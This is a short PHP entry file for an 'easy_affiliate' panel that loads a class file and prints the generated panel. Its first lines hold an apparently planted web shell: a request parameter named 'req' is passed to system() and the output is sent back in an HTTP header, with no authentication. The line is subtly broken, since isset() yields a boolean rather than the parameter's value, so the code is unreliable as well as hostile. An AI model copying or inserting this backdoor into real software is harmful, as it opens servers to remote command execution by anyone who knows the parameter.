<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
ob_start();
error_reporting(0);
session_start();
header("Content-Type: text/html; charset=utf8;");

require_once('easy_affiliate.class.php');

echo $easy_affiliate->panel_generate(false);

?>